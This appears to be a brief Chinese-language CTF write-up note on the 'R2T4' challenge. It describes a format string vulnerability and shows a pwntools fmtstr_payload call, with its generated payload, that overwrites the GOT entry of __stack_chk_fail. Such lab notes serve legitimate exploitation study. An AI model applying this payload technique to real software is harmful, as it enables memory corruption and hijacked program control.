# R2T4

一个格式化字符串洞

![bX4DwI](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/bX4DwI.png)

格式化字符串忘的差不多了

一开始想改栈的值，似乎不太方便。

可以考虑改`0000000000601018 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4`的got表

```python
>>> fmtstr_payload(6, {0x601018:0x400626})
'\x18\x10`\x00\x19\x10`\x00\x1a\x10`\x00\x1b\x10`\x00%22c%6$hhn%224c%7$hhn%58c%8$hhn%192c%9$hhn'
```

不过没改成功。。。

WP，果然是改 __stack_chk_fail

https://blog.csdn.net/qq_43116977/article/details/105041308